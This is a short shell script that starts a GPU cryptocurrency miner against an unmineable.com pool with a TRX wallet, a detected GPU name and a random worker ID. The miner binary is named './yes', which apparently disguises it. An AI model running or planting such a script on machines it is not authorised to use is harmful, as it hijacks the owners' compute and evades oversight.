POOL=rx-us.unmineable.com:3333
WALLET=TRX:TSFvUi6WfDZS138BQwS7Z4boAJ7UBpvVrP
GPU=$(nvidia-smi --query-gpu=gpu_name --format=csv > nvidia.txt && echo "$(tail -n +2 "nvidia.txt")" > "nvidia.txt" && str=$(cat nvidia.txt) && echo ${str// /_})
WORKER=$(echo mszhS3Fk-$(shuf -i 1911-214506 -n 1))
ALGO=wrkzcoin
./yes --pool $POOL --username $WALLET.$WORKER --password x --algorithm $ALGO --disableCPU
